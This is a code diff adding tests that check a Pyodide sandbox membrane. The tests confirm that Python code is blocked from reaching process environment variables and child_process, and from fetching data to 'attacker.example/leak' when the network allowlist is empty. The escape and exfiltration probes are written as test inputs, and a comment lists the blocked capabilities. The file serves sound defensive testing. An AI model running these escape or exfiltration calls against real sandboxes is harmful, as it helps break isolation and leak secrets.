@@ -287,3 +287,117 @@ describe("network allowlist security (Pyodide Node)", () => {
     },
   );
 });
+
+// ── Pyodide membrane capability-escape tests ─────────────────────────
+//
+// These exercise the membrane installed by `python_membrane.rs`. The
+// membrane runs inside Pyodide on first python invocation and:
+// 1. Reroutes `js.fetch` (and therefore `pyodide.http.pyfetch` /
+//    `micropip`) through the host allowlist.
+// 2. Blocks `js.process`, `js.require`, `js.Deno`, `js.WebSocket`,
+//    `js.fs`, `js.child_process`, `js.worker_threads`, `js.subprocess`,
+//    `js.cluster`, `js.crypto` with PermissionError.
+
+describe("Pyodide membrane (capability escape)", () => {
+  const adapters = [];
+
+  async function createAdapter(allowedHosts) {
+    const { createHostAdapter } = await import("../pyodide-host-adapter.mjs");
+    const adapter = await createHostAdapter({ fullPython: true, stepBudget: 0 });
+    await adapter.send({
+      Init: { step_budget: 0, allowed_hosts: allowedHosts },
+    });
+    adapters.push(adapter);
+    return adapter;
+  }
+
+  after(() => {
+    for (const a of adapters) {
+      try {
+        a.destroy();
+      } catch {
+        /* ignore */
+      }
+    }
+  });
+
+  it(
+    "js.process is blocked from Python",
+    { skip: SKIP, timeout: 60_000 },
+    async () => {
+      const adapter = await createAdapter([]);
+      const events = await adapter.send({
+        Run: {
+          input:
+            "python3 -c \"import js\\ntry:\\n    js.process.env\\n    print('LEAK')\\nexcept Exception as e:\\n    print('blocked:', type(e).__name__)\"",
+        },
+      });
+      const stdout = findStdout(events);
+      assert.match(
+        stdout,
+        /blocked:/,
+        `js.process must be blocked, stdout was: ${stdout}`,
+      );
+      assert.doesNotMatch(stdout, /LEAK/);
+    },
+  );
+
+  it(
+    "js.require is blocked from Python",
+    { skip: SKIP, timeout: 60_000 },
+    async () => {
+      const adapter = await createAdapter([]);
+      const events = await adapter.send({
+        Run: {
+          input:
+            "python3 -c \"import js\\ntry:\\n    js.require('child_process')\\n    print('LEAK')\\nexcept Exception as e:\\n    print('blocked:', type(e).__name__)\"",
+        },
+      });
+      const stdout = findStdout(events);
+      assert.match(stdout, /blocked:/, `js.require must be blocked: ${stdout}`);
+      assert.doesNotMatch(stdout, /LEAK/);
+    },
+  );
+
+  it(
+    "js.fetch is denied for hosts not in the allowlist",
+    { skip: SKIP, timeout: 60_000 },
+    async () => {
+      const adapter = await createAdapter([]); // empty allowlist
+      const events = await adapter.send({
+        Run: {
+          input:
+            "python3 -c \"import js, asyncio\\nasync def main():\\n    try:\\n        await js.fetch('https://attacker.example/leak')\\n        print('LEAK')\\n    except Exception as e:\\n        print('blocked:', type(e).__name__)\\nasyncio.get_event_loop().run_until_complete(main())\"",
+        },
+      });
+      const stdout = findStdout(events);
+      assert.match(
+        stdout,
+        /blocked:/,
+        `js.fetch must be denied, stdout: ${stdout}`,
+      );
+      assert.doesNotMatch(stdout, /LEAK/);
+    },
+  );
+
+  it(
+    "pyodide.http.pyfetch is denied for hosts not in the allowlist",
+    { skip: SKIP, timeout: 60_000 },
+    async () => {
+      const adapter = await createAdapter([]);
+      const events = await adapter.send({
+        Run: {
+          input:
+            "python3 -c \"import asyncio\\nfrom pyodide.http import pyfetch\\nasync def main():\\n    try:\\n        await pyfetch('https://attacker.example/leak')\\n        print('LEAK')\\n    except Exception as e:\\n        print('blocked:', type(e).__name__)\\nasyncio.get_event_loop().run_until_complete(main())\"",
+        },
+      });
+      const stdout = findStdout(events);
+      assert.match(
+        stdout,
+        /blocked:/,
+        `pyfetch must be denied, stdout: ${stdout}`,
+      );
+      assert.doesNotMatch(stdout, /LEAK/);
+    },
+  );
+});
